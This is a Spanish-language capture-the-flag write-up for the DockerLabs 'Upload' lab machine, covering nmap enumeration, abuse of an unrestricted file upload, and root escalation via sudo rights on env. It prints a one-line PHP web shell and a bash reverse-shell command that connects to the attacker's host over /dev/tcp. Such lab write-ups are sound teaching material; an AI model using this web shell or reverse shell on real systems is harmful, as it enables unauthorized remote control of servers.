---
Nombre de la máquina: Upload
Sistema Operativo: Linux
Dificultad: Very Easy 🔵
Skills: File Upload, RCE, Reverse Shell, Abusing sudoers
Enlace de descarga: https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ
---
----

## Montando el laboratorio

Lo primero que deberemos hacer para practicar con esta máquina es, dirigirnos a la página de [dockerlabs](https://dockerlabs.es/) y descargarnos la máquina desde el [siguiente enlace](https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ).

```
sudo bash auto_deploy.sh upload.tar
```

Al ejecutar el comando, nos pedirá la contraseña. Al introducirla correctamente, tendremos que esperar hasta que nos indique que la máquina está desplegada.

![Desplegando máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/2bd227ab-c8fd-41bd-8519-6ff2025cc0f5)

Como podemos ver en la imagen anterior, la máquina está desplegada correctamente y su dirección IP es la **172.17.0.2**.

## Como eliminar la máquina vulnerable

Esto nos habrá montado la máquina vulnerable *Upload* a través de *docker*. En caso de querer eliminarla, simplemente presionaremos en el teclado **CTRL** + **C** y la máquina se eliminará automáticamente.

![Eliminando máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/8bc6feba-fd43-4ab0-ac14-3ac78febbfd4)

## Comprobando la conectividad

Una vez desplegada, deberemos cerciorarnos de que tenemos conectividad con esta. Para ello, haremos uso del comando `ping` para realizar el chequeo.

![ping máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/d73924fd-658c-4bec-9e59-458f97202775)

Comprobamos que tenemos conectividad y, podemos intuir mediante el **TTL** que, el sistema operativo de la máquina víctima es *Linux*.

## Enumeración

Pasaremos con la enumeración de la máquina. Ejecutaremos el siguiente comando con el fin de descubrir posibles puertos abiertos de la víctima.

```
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

Al ejecutar el comando anterior, el resultado es el siguiente.

![Primer nmap de la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/9ff7c63f-24e0-4599-a338-74714f68119c)

Observamos que, los puertos que están abiertos son el puerto *80*. Ahora que sabemos esto, detectaremos la versión y servicio que corren bajo dichos puertos y lanzaremos una serie de scripts de enumeración propios de la herramienta `nmap` para que nos muestre información adicional.

```
sudo nmap -sCV -p80 172.17.0.2
```

Ejecutamos el comando.

![Segundo nmap de la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/3b4b7457-dc66-4223-adb9-eee35eb462b8)

En el resultado anterior detectamos que, bajo el puerto 80 está corriendo **HTTP** siendo *Apache* el servicio utilizado. Antes de realizar ningún *fuzzing* de subdirectorios, con herramientas como `fuzz` o `gobuster` ejecutaremos el script *http-enum.nse* de `nmap` para ver si nos devuelve algo interesante.

```
sudo nmap --script=http-enum 172.17.0.2
```

Ejecutamos el comando.

![http-enum de la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/58f24bf8-5b7a-410b-bd80-b5151b2d39fa)

Hemos identificado el directorio `/uploads/`, el cual será relevante en un futuro, ya que parece ser el destino de los archivos cargados durante alguna carga de archivos.

Vamos a visitar el sitio en cuestión.

![puerto 80 máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/a62046e8-1e9e-4584-8dcd-4ec93cfe051b)

Parece ser que podemos subir ficheros desde aquí lo cual es interesante, ya que si recordamos, anteriormente hemos descubierto el subdirectorio `/uploads/` y podemos pensar que son estos ficheros los que se pueden almacenar ahí.

Vamos a probar subiendo una simple imagen.

![imagen subida máquina upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/83c4f444-fa94-4c92-9600-324e95da4c0f)

Vemos que la imagen se ha subido satisfactoriamente, por lo que averigüemos si realmente el subdirectorio en cuestión almacena estos ficheros.

![Uploads directory máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/167d9a6c-822b-4041-90fe-15fa79e458aa)

Y efectivamente, este directorio almacena los ficheros que subamos en la página principal. 

## Acceso al sistema (RCE)

Ahora que sabemos que podemos subir ficheros, y tenemos el directorio donde se almacenan, procederemos a subir un fichero *.php* malicioso, con el fin de probar si se puede derivar esta subida de archivos a un **RCE**.

Subiré un fichero **PHP** con el siguiente contenido:

```php
<?php
	system($_GET['cmd']);
?>
```

Este código se encarga de crear un parámetro con nombre *cmd*, el cual ejecutará el comando que le indiquemos. En la siguiente imagen, vemos que nos ha dejado subir este fichero.

![Subiendo fichero PHP malicioso a la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/5a068f94-e115-442a-b25d-4d6f824b78de)

Seguidamente, nos iremos al directorio `/uploads/` y nos meteremos en el fichero subido.

![rce máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/a0abb1cf-2014-40b7-9a23-9a08f4ac76e5)

Si probamos a ejecutar cualquier comando, observaremos que hemos conseguido una *ejecución remota de código* o **RCE**. Con esto, nos podremos enviar una *reverse shell* hacia nuestra máquina de atacantes con el siguiente comando:

```
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

Para lograr acceder a la máquina víctima, nos tendremos que poner en escucha por el puerto indicado en el comando anterior.

![Nos ponemos en escucha para la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/4cb8de8a-3321-46e2-bdc9-abb512d83376)

Seguidamente, ejecutamos el comando.

![Reverse Shell máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/859de00f-5aaf-4b10-a8c7-5c99ca6f65f0)

Gracias a esto, lograremos acceso a la máquina víctima desde la terminal que teníamos en escucha por el puerto *443*, en este caso.

![Acceso a la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/937daeb9-8fb2-4d3e-9c9e-ec6084c3cd42)

## Escalada de privilegios (acceso como root)

Lo primero que haremos nada más entrar es, comprobar nuestros permisos a nivel de *sudoers* con el siguiente comando:

```
sudo -l
```

Nos encontramos con que podemos ejecutar el comando `env` como el usuario *root*.

![Privilegios sudoers máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/d3893eb7-5124-418f-b2dd-84eebf93873a)

Podemos ver que en [GTFOBins](https://gtfobins.github.io/) hay una vía potencial de escalar privilegios con este permiso otorgado.

![Escalada de privilegios con el comando env en la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/3d246e6d-a4ef-415f-af29-de9d9eb38f55)

Al ejecutar el comando que nos comentan, podemos ver como hemos conseguido acceso como el usuario *root*.

![LPE abusando del comando env permisos sudoers en la máquina Upload](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/d4e8bfa9-8119-45f2-961e-ba8207173c3f)

Y ya habremos *rooteado* la máquina **Upload**.
